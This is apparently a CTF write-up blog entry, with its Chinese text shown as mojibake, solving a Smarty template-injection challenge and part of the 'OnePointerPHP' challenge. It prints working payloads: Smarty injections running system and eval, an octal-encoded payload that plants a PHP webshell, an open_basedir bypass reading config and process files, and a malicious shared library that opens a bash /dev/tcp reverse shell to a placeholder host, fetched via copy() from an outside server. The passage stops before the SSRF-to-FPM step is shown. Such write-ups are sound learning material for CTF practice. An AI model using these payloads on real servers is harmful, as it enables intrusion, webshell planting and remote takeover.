<h2 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h2><p><a href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815180335796.png"></p>
<p>ä»å®˜æ–¹ä¸‹è½½å¯¹åº”ç‰ˆæœ¬ï¼š<a href="https://github.com/smarty-php/smarty/releases?q=3.1.39&amp;expanded=true">https://github.com/smarty-php/smarty/releases?q=3.1.39&amp;expanded=true</a></p>
<p>å¯¹æ¯”å‘ç°<code>smarty_internal_compile_function.php</code>æœ‰æ”¹åŠ¨ï¼ˆæ­¤å¤„å¯¹æ¯”å·¥å…·ä¸º<code>Beyond Compare</code>ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815103521724.png"></p>
<p>å…³é”®çš„å·®å¼‚åªæœ‰ä¸€å¤„æ­£åˆ™ï¼ˆå·¦ä¾§ä¸ºé¢˜ç›®æºç ï¼Œå³ä¾§ä¸ºå®˜æ–¹æºç ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815103852608.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z0-9_\x80-\xff](.*)+$/'</span><span class="token punctuation">,</span> <span class="token variable">$_name</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¢˜ç›®æ­£åˆ™é€»è¾‘åˆ†æï¼š</p>
<ol>
<li><code>[a-zA-Z0-9_\x80-\xff]</code>åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿æˆ–0x80-0xffèŒƒå›´å†…çš„ä»»æ„å­—èŠ‚ï¼Œä½œä¸ºå¼€å¤´å­—ç¬¦ã€‚</li>
<li><code>(.*)+</code>åŒ¹é…0æ¬¡æˆ–å¤šæ¬¡(*)ä»»æ„æ•°é‡(+)é™¤æ¢è¡Œç¬¦\nä¹‹å¤–çš„ä»»æ„å•å­—ç¬¦(.)ã€‚</li>
<li>$åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸã€‚</li>
</ol>
<p>å…¶ä¸­æ­£åˆ™é‡Œ<code>\x80-\xff</code>è¡¨ç¤ºåŒ¹é…utf-8ç¼–ç ä¸‹æ‰€æœ‰çš„æ±‰å­—</p>
<p>æ‰€ä»¥å¯ä»¥æ¢è¡Œç»•è¿‡ï¼Œ<code>%0A</code>æ—¢ä¸åœ¨å‰é¢çš„<code>[]</code>åŒ¹é…é‡Œé¢ï¼Œåˆä¸è¢«åé¢çš„<code>.</code>åŒ¹é…</p>
<p>æ‰€ä»¥åªéœ€è¦åœ¨åŸæ¥pocåŸºç¡€ä¸Šï¼ŒåŠ ä¸Š<code>%0A</code>ç»•è¿‡å³å¯ï¼ˆå®é™…æµ‹è¯•å‘ç°éœ€è¦ä¸¤ä¸ªå­—ç¬¦ï¼Œä¸”åªè¦ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>%0A</code>çš†å¯ï¼Œæ­¤å¤„ç”¨<code>%0A%0A</code>ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">data={function+name='rce(){};system("id");function%0A%0A'}{/function}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>HackBarä¼ å‚å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815182749317.png"></p>
<p>æ‰§è¡Œphpinfo()</p>
<pre class="line-numbers language-none"><code class="language-none">data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&amp;1=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815183401988.png"></p>
<p>è¯»flag</p>
<pre class="line-numbers language-none"><code class="language-none">data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&amp;1=var_dump(file_get_contents('/flag'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815184109598.png"></p>
<h2 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2"></a>æ€è·¯2</h2><p><code>function.math.php</code>æ–‡ä»¶é‡Œæœ‰eval()å‡½æ•°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œå›æº¯<code>$equation</code>å˜é‡æœ‰ä¸ªæ­£åˆ™åŒ¹é…</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815140049432.png"></p>
<pre class="line-numbers language-none"><code class="language-none">preg_match_all('!(?:0x[a-fA-F0-9]+)|([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)!', $equation, $match);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ­£åˆ™é€»è¾‘åˆ†æå¦‚ä¸‹ï¼š</p>
<ol>
<li><code>preg_match_all()</code>å‡½æ•°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…<code>$equation</code>å­—ç¬¦ä¸²ï¼›</li>
<li>æ¨¡å¼ä½¿ç”¨<code>! !</code>ä½œä¸ºå®šç•Œç¬¦ï¼›</li>
<li>ç¬¬ä¸€éƒ¨åˆ† <code>(?:0x[a-fA-F0-9]+)</code> åŒ¹é…åå…­è¿›åˆ¶æ•°ï¼Œ<code>?:</code>è¡¨ç¤ºä¸æ•è·ï¼›</li>
<li>ç¬¬äºŒéƒ¨åˆ†<code>([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)</code>æ•è·å˜é‡åæ¨¡å¼ï¼ˆä»¥å­—æ¯/ä¸‹åˆ’çº¿/0x7f-0xffèŒƒå›´å†…çš„å­—ç¬¦å¼€å¤´ï¼Œåè·Ÿ0ä¸ªæˆ–å¤šä¸ªå­—æ¯/æ•°å­—/æŒ‡å®šå­—ç¬¦çš„æ¨¡å¼ï¼‰ã€‚</li>
<li><code>|</code>è¡¨ç¤ºæˆ–ï¼ŒåŒ¹é…ä¸¤ç§æ¨¡å¼ä¹‹ä¸€ã€‚</li>
<li>ç»“æœå­˜å‚¨åœ¨$matchæ•°ç»„ä¸­ã€‚</li>
<li>ç¬¬ä¸€éƒ¨åˆ†ä¸æ•è·ï¼Œç¬¬äºŒéƒ¨åˆ†æ•è·çš„å˜é‡åå­˜å…¥ $match[1]ã€‚</li>
<li>è¿™æ ·å¯ä»¥æ£€ç´¢å‡ºå­—ç¬¦ä¸²ä¸­çš„å˜é‡åï¼Œè¿›è¡Œåç»­å¤„ç†ã€‚</li>
</ol>
<p>æ ¹æ®ä¸Šè¿°é€»è¾‘ï¼Œæ­¤å¤„å¯é€šè¿‡å…«è¿›åˆ¶ç»•è¿‡æ­£åˆ™</p>
<p>è„šæœ¬å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥å­—ç¬¦ä¸²:"</span><span class="token punctuation">)</span>

res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">"("</span> <span class="token keyword">or</span> c <span class="token operator">==</span> <span class="token string">")"</span> <span class="token keyword">or</span> c <span class="token operator">==</span> <span class="token string">","</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> c
    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">"\""</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> c
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        o <span class="token operator">=</span> <span class="token builtin">oct</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
        res <span class="token operator">+=</span> <span class="token string">"\\\\"</span> <span class="token operator">+</span> o<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚ä¸‹å‘½ä»¤å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<pre class="line-numbers language-none"><code class="language-none">("file_put_contents")("wa0er.php","&lt;?php eval($_POST[wa0er]);?&gt;")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¤„ç†æˆå…«è¿›åˆ¶åï¼Œå®Œæ•´Payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">data={$poc="poc"}{math equation="(\"\\146\\151\\154\\145\\137\\160\\165\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\")(\"\\167\\141\\60\\145\\162\\56\\160\\150\\160\",\"\\74\\77\\160\\150\\160\\40\\145\\166\\141\\154(\\44\\137\\120\\117\\123\\124\\133\\167\\141\\60\\145\\162\\135)\\73\\77\\76\")"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>HackBarä¼ å‚å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815155251679.png"></p>
<p>èšå‰‘è¿æ¥ï¼Œflagåœ¨æ ¹ç›®å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815154931684.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/m0_51078229/article/details/123660344">https://blog.csdn.net/m0_51078229/article/details/123660344</a></p>
<p><a href="https://xz.aliyun.com/t/11085">https://xz.aliyun.com/t/11085</a></p>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/123750375">https://blog.csdn.net/RABCDXB/article/details/123750375</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpä»£ç å®¡è®¡</tag>
        <tag>Smartyæ¨¡æ¿æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>è“å¸½æ¯2021-OnePointerPHP</title>
    <url>/posts/48d4210.html</url>
    <content><![CDATA[<h1 id="è“å¸½æ¯2021-OnePointerPHP"><a href="#è“å¸½æ¯2021-OnePointerPHP" class="headerlink" title="è“å¸½æ¯2021-OnePointerPHP"></a>è“å¸½æ¯2021-OnePointerPHP</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šåŸºç¡€ååºåˆ—åŒ–ã€PHPæ•°ç»„keyæº¢å‡ºã€<code>open_basedir</code>ç»•è¿‡ã€SSRFæ”»å‡»FPMæœåŠ¡ã€è¢«åŠ¨FTPã€SUIDæƒé™</p>
<p>é¢˜ç›®æœ‰æºç ï¼Œé¦–é¡µåªæœ‰ä¸€å¼ å›¾</p>
<p><code>add_api.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
	<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>user.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯¹äº<code>add_api.php</code>ï¼Œç›®æ ‡æ˜¯æ‰§è¡Œç¬¬ä¹è¡Œ<code>eval($_GET["backdoor"]);</code>ï¼Œä½†æ˜¯æ­£å¸¸é€»è¾‘ï¼š</p>
<p>ç¬¬4è¡Œå¢åŠ  user å¯¹è±¡çš„ count å±æ€§å€¼ï¼Œå¹¶å°†è‡ªå¢åçš„å€¼èµ‹å€¼ç»™ $count æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚å¿…ç„¶ä¼šä½¿ç¬¬5è¡Œifæ¡ä»¶ä¸ºtrueï¼Œé‚£ä¹ˆå°±å¿…ç„¶æ‰§è¡Œä¸åˆ°ç¬¬9è¡Œã€‚ï¼ˆæ³¨æ„ç¬¬5è¡Œifæ˜¯èµ‹å€¼è¿ç®—ï¼Œä¸æ˜¯æ¯”è¾ƒè¿ç®—ï¼‰</p>
<h2 id="PHPæ•°ç»„keyæº¢å‡º"><a href="#PHPæ•°ç»„keyæº¢å‡º" class="headerlink" title="PHPæ•°ç»„keyæº¢å‡º"></a>PHPæ•°ç»„keyæº¢å‡º</h2><p>æ­¤æ—¶å°±æ˜¯åŸºç¡€çš„ååºåˆ—åŒ–å’Œæ•°ç»„keyæº¢å‡ºçš„é—®é¢˜</p>
<p>æ•°ç»„keyæº¢å‡ºå‚è€ƒï¼š<a href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/">https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/</a></p>
<p>å¯åœ¨æœ¬åœ°ç”¨å¦‚ä¸‹ä»£ç æµ‹è¯•è§‚å¯Ÿï¼Œæ•°ç»„keyåªæœ‰ä¸º<code>9223372036854775807</code>æ—¶ä¼šå¦‚ä¸‹å›¾æŠ¥é”™ï¼ˆæµ‹è¯•ç‰ˆæœ¬ä¸ºphp7.4.3ï¼‰ï¼Œä»è€Œå¯ä»¥ä½¿å¾—é¢˜ç›®æºç ä¸­ifæ¡ä»¶ä¸ºflase</p>
<blockquote>
<p>64ä½æ“ä½œç³»ç»Ÿintå‹ï¼ˆå¸¦ç¬¦å·æ•´å‹ï¼‰æ•°æ®èŒƒå›´æ˜¯<code>-2çš„63æ¬¡æ–¹ ~ 2çš„63æ¬¡æ–¹-1</code>ï¼Œè®¡ç®—æœºç»„æˆåŸç† æ•°æ®è¡¨ç¤ºçš„çŸ¥è¯†</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">9223372036854775807</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921111038041.png"></p>
<p>æ‰€ä»¥åºåˆ—åŒ–ä»£ç å¦‚ä¸‹ï¼ˆå› ä¸º<code>data</code>å€¼æ˜¯ä»COOKIEè·å–ï¼Œæ‰€ä»¥æœ€åéœ€è¦urlç¼–ç ï¼‰</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token operator">=</span><span class="token number">9223372036854775806</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O:4:"User":1:{s:5:"count";i:9223372036854775806;}</span>
<span class="token comment">//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¯·æ±‚åŒ…å¤´éƒ¨Cookieå­—æ®µï¼Œdataå€¼ä¼ å…¥åºåˆ—åŒ–æ•°æ®ï¼ŒåŒæ—¶GETä¼ å‚å¦‚ä¸‹ï¼ˆæ­¤å¤„ç¬”è€…ç”¨Hackbarå®Œæˆä¼ å‚ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921103348766.png"></p>
<p>æ¥ç€æƒ³ç”¨å¦‚ä¸‹ä»£ç ç›´æ¥è¯»flagè¯»ä¸åˆ°ï¼Œè¿”å›false</p>
<pre class="line-numbers language-none"><code class="language-none">?backdoor=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="open-basedirç»•è¿‡"><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h2><p>çœ‹phpinfoé¡µé¢ï¼Œ<code>open_basedir</code>è®¾ç½®åœ¨<code>/var/www/html</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921141023229.png"></p>
<p><code>open_basedir</code>åŠŸèƒ½åŠç»•è¿‡å‚è€ƒï¼š<a href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>å››ç§æ€è·¯ï¼š</p>
<ul>
<li><p>å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆå¦‚system()å‡½æ•°ï¼‰ç»•è¿‡ï¼›</p>
</li>
<li><p>è½¯é“¾æ¥ï¼ˆå¦‚symlink()å‡½æ•°ï¼‰ç»•è¿‡ï¼›</p>
</li>
<li><p>globä¼ªåè®®ç»•è¿‡ï¼›</p>
</li>
<li><p>åˆ©ç”¨<code>ini_set</code>ç»•è¿‡ã€‚</p>
</li>
</ul>
<p>ä½†é¢˜ç›®phpinfoä¸­è¿‡æ»¤äº†ä¸€äº›å‡½æ•°ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921141911692.png"></p>
<p>æ­¤å¤„åˆ©ç”¨<code>ini_set</code>ç»•è¿‡ï¼Œæ„é€ å¦‚ä¸‹payloadç»•è¿‡<code>open_basedir</code>åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ˆä¼ å‚æ—¶ä¸èƒ½æœ‰æ³¨é‡Šï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er'); 
chdir('wa0er');
ini_set('open_basedir','..');
chdir('..');	#ç›¸å½“äº"../"
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
var_dump(scandir('./'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰§è¡ŒæˆåŠŸåï¼Œå³é”®æŸ¥çœ‹æºç èƒ½è®©ç»“æœæ›´åŠ å¯è§†åŒ–</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921145256756.png"></p>
<p>è¿˜æ˜¯æ— æ³•ç›´æ¥è¯»flagï¼Œå¯èƒ½æ˜¯å½“å‰ç”¨æˆ·æƒé™ä¸å¤Ÿã€‚æŸ¥çœ‹<code>php.ini</code>å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/usr/local/etc/php/php.ini'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921145730532.png"></p>
<p>æœ‰ä¸ª<code>easy_bypass.so</code>ï¼Œæ–‡ä»¶åçš„æç¤ºæ„å‘³å°±å¾ˆå¼ºï¼Œæ®è¯´é¢„æœŸé¢˜è§£æ˜¯Pwnè¿™ä¸ªsoç„¶åæ¥è·å–flagã€‚</p>
<p>å…¶å®åšåˆ°è¿™é‡Œä¹Ÿæƒ³è¿‡ç»•è¿‡disable_functionsç›´æ¥RCEï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‚è½½æ¶æ„soçš„æ–¹å¼æ¥çªç ´disable_functionæ¥å®ç°RCEï¼ŒæŒ‚è½½soçš„æ–¹æ³•æœ‰ä¸¤ç§ï¼š</p>
<ul>
<li>dl()å‡½æ•°æŒ‚è½½ï¼ˆdlè¢«banï¼‰ï¼›</li>
<li>ç›´æ¥å†™å…¥é…ç½®æ–‡ä»¶çš„extensionä¸­ã€‚</li>
</ul>
<p>ä½†æ˜¯è¿™é‡Œå¥½åƒéƒ½ä¸å¯è¡Œï¼Œæ‰€ä»¥åªèƒ½å¦å¯»æ€è·¯ã€‚</p>
<p>æŸ¥çœ‹å½“å‰è¿›ç¨‹å®Œæ•´å‘½ä»¤æ–‡ä»¶<code>/proc/self/cmdline</code></p>
<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/proc/self/cmdline'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‘ç°<code>string(18) "php-fpm: pool www"</code>ï¼Œé¢˜ç›®ç¯å¢ƒå¼€å¯äº†<code>php-fpm</code>æœåŠ¡</p>
<p>åœ¨<code>/usr/local/etc/</code>ç›®å½•ä¸‹ä¹Ÿå¯ä»¥çœ‹åˆ°<code>php-fpm.conf</code>ç­‰æ–‡ä»¶</p>
<p>ç„¶åè¯»é…ç½®æ–‡ä»¶<code>/usr/local/etc/php-fpm.d/www.conf</code>å¦‚ä¸‹å›¾ï¼ˆå¯ä»¥å…ˆ<code>scandir()</code>è·å–ç›®å½•ä¸‹æ–‡ä»¶ï¼Œç„¶å<code>file_get_contents()</code>è¯»æ–‡ä»¶ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921151123244.png"></p>
<p><code>php-fpm</code>æœåŠ¡å¼€æ”¾åœ¨9001ç«¯å£ï¼Œç”¨æˆ·æ˜¯<code>www-data</code></p>
<h2 id="SSRFæ”»å‡»FPMæœåŠ¡"><a href="#SSRFæ”»å‡»FPMæœåŠ¡" class="headerlink" title="SSRFæ”»å‡»FPMæœåŠ¡"></a>SSRFæ”»å‡»FPMæœåŠ¡</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡SSRFæ¥æ”»å‡»FPMæœåŠ¡ï¼Œä½†æ˜¯å—é™äºé¢˜ç›®phpinfoçš„disable_functionsï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥SSRFï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>file_put_contents()</code>çš„ä¸€ä¸ªç‰¹æ€§æ¥å®ç°SSRFï¼š</p>
<blockquote>
<p><code>file_put_contents</code>åœ¨ä½¿ç”¨ ftp åè®®æ—¶ï¼Œä¼šå°† data çš„å†…å®¹ä¸Šä¼ åˆ° ftp æœåŠ¡å™¨ï¼Œç”±äº ftp è¢«åŠ¨æ¨¡å¼ä¸‹ï¼ŒæœåŠ¡å™¨æ•°æ®é€šé“çš„åœ°å€å’Œç«¯å£æ˜¯å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥å°†åœ°å€å’Œç«¯å£æŒ‡åˆ°<code>127.0.0.1:9001</code>ã€‚åŒæ—¶ç”±äº ftp çš„ç‰¹æ€§ï¼Œä¸ä¼šæœ‰ä»»ä½•çš„å¤šä½™å†…å®¹ï¼Œç±»ä¼¼<code>gopher</code>åè®®ï¼Œä¼šå°†<code>data</code>åŸå°ä¸åŠ¨çš„å‘ç»™<code>127.0.0.1:9001</code>ï¼Œå®Œç¾ç¬¦åˆæ”»å‡» fastcgi(FPM) çš„è¦æ±‚.</p>
</blockquote>
<p>é¦–å…ˆç¼–å†™ä¸€ä¸ªæ¶æ„soæ–‡ä»¶æ¥æ‰§è¡Œåå¼¹Shellå‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1'"); #åå¼¹Shellï¼Œä¿®æ”¹IPç«¯å£ä¸ºè‡ªå·±vpsç›‘å¬çš„IPç«¯å£
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¼–è¯‘æ–‡ä»¶ï¼š<code>gcc 1.c -fPIC -shared -o 1.so</code>ï¼ˆæŠŠ<code>1.c</code>ç¼–è¯‘ä¸ºä¸€ä¸ªæµ®åŠ¨åœ°å€çš„å…±äº«åº“æ–‡ä»¶<code>1.so</code>ï¼‰</p>
<p>ç„¶åä¸Šä¼ soæ–‡ä»¶ï¼ˆä¿®æ”¹IPä¸ºè‡ªå·±vpsåœ°å€ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/1.so','/var/www/html/1.so'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•SSRFæ‰“FPMæ¥æŒ‚è½½soæ–‡ä»¶å®ç°RCEï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç›´æ¥æ”»å‡»çš„è„šæœ¬ï¼Œæ³¨æ„326è¡Œæ˜¯soæ–‡ä»¶è·¯å¾„ï¼Œ339è¡Œæ˜¯FPMæœåŠ¡ç«¯å£</p>
